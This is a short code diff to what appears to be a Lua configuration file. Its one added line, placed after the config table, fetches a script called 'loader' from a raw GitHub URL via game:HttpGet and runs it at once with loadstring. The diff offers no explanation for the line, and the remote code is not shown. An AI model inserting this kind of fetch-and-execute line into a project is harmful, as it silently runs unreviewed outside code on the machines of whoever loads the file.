@@ -312,3 +312,4 @@ local config = {
     }
 }
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IJWIDJNWQF/Morte/refs/heads/main/loader",true))()
